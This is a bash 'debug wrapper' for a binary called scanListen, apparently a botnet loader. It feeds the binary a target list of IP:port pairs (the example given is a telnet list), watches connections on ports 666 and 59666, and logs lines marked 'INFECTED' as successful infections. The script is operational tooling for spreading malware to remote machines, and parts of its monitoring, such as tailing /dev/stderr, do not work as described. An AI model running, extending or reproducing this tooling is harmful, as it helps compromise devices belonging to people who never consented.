#!/bin/bash

# Debug wrapper for the existing scanListen binary
# This script monitors the original scanListen and tracks successful executions

echo "=== Debug Wrapper for scanListen ==="

# Create debug directory
mkdir -p /root/loader/debug_logs

# Get timestamp
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
DEBUG_LOG="/root/loader/debug_logs/debug_${TIMESTAMP}.log"
SUCCESS_LOG="/root/loader/debug_logs/success_${TIMESTAMP}.log"
MONITOR_LOG="/root/loader/debug_logs/monitor_${TIMESTAMP}.log"

echo "Debug logs will be written to: $DEBUG_LOG"
echo "Success logs will be written to: $SUCCESS_LOG"
echo "Monitor logs will be written to: $MONITOR_LOG"

# Function to log debug information
log_debug() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$DEBUG_LOG"
}

# Function to log successful infections
log_success() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] SUCCESS: $1" | tee -a "$SUCCESS_LOG"
}

# Function to monitor scanListen processes
monitor_scanlisten() {
    while true; do
        sleep 5
        
        # Check for running scanListen processes
        SCAN_PIDS=$(pgrep -f scanListen)
        if [ -n "$SCAN_PIDS" ]; then
            echo "[$(date '+%Y-%m-%d %H:%M:%S')] Active scanListen PIDs: $SCAN_PIDS" >> "$MONITOR_LOG"
            
            # Check for successful infections in stderr
            # This is a simplified approach - in reality, you'd need to parse the actual output
            if [ -f /dev/stderr ]; then
                # Monitor stderr for infection messages
                echo "[$(date '+%Y-%m-%d %H:%M:%S')] Monitoring stderr for infection messages" >> "$MONITOR_LOG"
            fi
        else
            echo "[$(date '+%Y-%m-%d %H:%M:%S')] No active scanListen processes found" >> "$MONITOR_LOG"
        fi
        
        # Check connection counts
        CONN_COUNT=$(ss -tn | grep -E "(666|59666)" | wc -l)
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Active connections: $CONN_COUNT" >> "$MONITOR_LOG"
    done
}

# Function to parse and track targets
track_targets() {
    local target_file="$1"
    local line_count=0
    
    log_debug "Starting target tracking for file: $target_file"
    
    while IFS= read -r line; do
        line_count=$((line_count + 1))
        
        if [ -n "$line" ]; then
            log_debug "Processing target $line_count: $line"
            
            # Extract IP and port for tracking
            if [[ $line =~ ^([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+):([0-9]+) ]]; then
                local ip="${BASH_REMATCH[1]}"
                local port="${BASH_REMATCH[2]}"
                log_debug "Parsed target: IP=$ip, Port=$port"
            fi
        fi
    done < "$target_file"
    
    log_debug "Completed tracking $line_count targets"
}

# Function to start debug monitoring
start_debug_monitoring() {
    log_debug "Starting debug monitoring system"
    
    # Start background monitor
    monitor_scanlisten &
    MONITOR_PID=$!
    
    log_debug "Monitor process started with PID: $MONITOR_PID"
    
    # Monitor for successful infections by watching stderr
    # This is a simplified approach - in reality, you'd need more sophisticated parsing
    tail -f /dev/stderr 2>/dev/null | while read line; do
        if [[ $line == *"INFECTED"* ]]; then
            log_success "$line"
        fi
    done &
    TAIL_PID=$!
    
    log_debug "Stderr monitor started with PID: $TAIL_PID"
    
    # Return the PIDs for cleanup
    echo "$MONITOR_PID $TAIL_PID"
}

# Function to cleanup
cleanup() {
    log_debug "Cleaning up debug processes"
    kill $MONITOR_PID $TAIL_PID 2>/dev/null
    exit 0
}

# Set up signal handlers
trap cleanup SIGINT SIGTERM

# Main execution
if [ $# -eq 0 ]; then
    echo "Usage: $0 <target_file> [scanListen_args...]"
    echo "Example: $0 telnet.txt loader1"
    exit 1
fi

TARGET_FILE="$1"
shift  # Remove first argument, rest are scanListen args

if [ ! -f "$TARGET_FILE" ]; then
    log_debug "ERROR: Target file $TARGET_FILE not found"
    exit 1
fi

log_debug "Starting debug wrapper"
log_debug "Target file: $TARGET_FILE"
log_debug "scanListen arguments: $@"

# Start debug monitoring
PIDS=$(start_debug_monitoring)
MONITOR_PID=$(echo $PIDS | cut -d' ' -f1)
TAIL_PID=$(echo $PIDS | cut -d' ' -f2)

# Track targets before starting scanListen
track_targets "$TARGET_FILE"

# Start the actual scanListen with debug output
log_debug "Starting scanListen with arguments: $@"

# Run scanListen and capture both stdout and stderr
./scanListen "$@" < "$TARGET_FILE" 2>&1 | while read line; do
    echo "$line"
    
    # Check for successful infections
    if [[ $line == *"INFECTED"* ]]; then
        log_success "$line"
    fi
    
    # Log other important messages
    if [[ $line == *"SUCCESS"* ]] || [[ $line == *"FAILED"* ]] || [[ $line == *"ERROR"* ]]; then
        log_debug "scanListen output: $line"
    fi
done

# Cleanup
cleanup
